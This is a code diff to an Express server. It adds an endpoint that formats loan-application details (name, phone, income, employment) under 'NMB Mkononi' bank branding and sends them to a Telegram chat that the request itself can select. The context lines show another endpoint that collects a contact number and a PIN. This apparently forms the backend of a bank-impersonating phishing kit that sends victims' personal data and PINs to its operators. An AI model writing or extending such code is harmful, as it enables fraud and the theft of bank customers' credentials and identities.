@@ -277,6 +277,44 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// NEW ENDPOINT: Handles loan submissions from step 3 and forwards them to Telegram
+app.post('/api/submit-loan', async (req, res) => {
+  try {
+    let { loanType, amount, term, purpose, firstName, lastName, phone, employment, annualIncome, adminChatId } = req.body || {};
+
+    if (!adminChatId && req.query && req.query.admin) {
+      adminChatId = req.query.admin;
+    }
+
+    const targetChat = resolveTargetChat(adminChatId);
+    if (!targetChat) {
+      return res.status(400).json({ success: false, error: 'Destination chat ID missing.' });
+    }
+
+    const message = 
+      `🔔 *Maombi Mapya ya Mkopo - NMB Mkononi*\n\n` +
+      `👤 *Jina:* ${firstName || 'N/A'} ${lastName || ''}\n` +
+      `📞 *Simu:* +255 ${phone || 'N/A'}\n` +
+      `📌 *Aina ya Mkopo:* ${loanType || 'N/A'}\n` +
+      `💰 *Kiasi cha Mkopo:* TSh ${Number(amount || 0).toLocaleString()}\n` +
+      `⏱️ *Muda:* ${term || 'N/A'}\n` +
+      `📝 *Madhumuni:* ${purpose || 'N/A'}\n` +
+      `💼 *Ajira:* ${employment || 'N/A'}\n` +
+      `💵 *Mapato ya Mwaka:* TSh ${Number(annualIncome || 0).toLocaleString()}`;
+
+    if (!bot) {
+      return res.status(500).json({ success: false, error: 'Bot instance not initialized' });
+    }
+
+    await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
+
+    return res.status(200).json({ success: true });
+  } catch (err) {
+    console.error('Telegram Loan Delivery Error:', err);
+    return res.status(500).json({ success: false, error: 'Telegram delivery failed: ' + (err?.message || 'Unknown error') });
+  }
+});
+
 app.post('/api/submit-application', async (req, res) => {
   try {
     let { contact, pin, amount, adminChatId } = req.body || {};
@@ -434,4 +472,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-    
+                  
